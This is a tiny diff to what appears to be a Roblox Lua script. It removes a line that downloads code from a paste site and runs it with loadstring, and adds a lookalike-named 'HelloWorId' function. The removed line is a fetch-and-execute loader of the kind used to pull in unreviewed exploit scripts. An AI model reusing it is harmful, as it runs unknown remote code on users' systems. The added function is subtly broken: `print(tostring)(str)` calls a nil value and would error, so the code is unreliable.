@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/jD5PKqvv/raw"))()
+function HelloWorId(str)
+    print(tostring)(str)
+end
+
+HelloWorId("print")
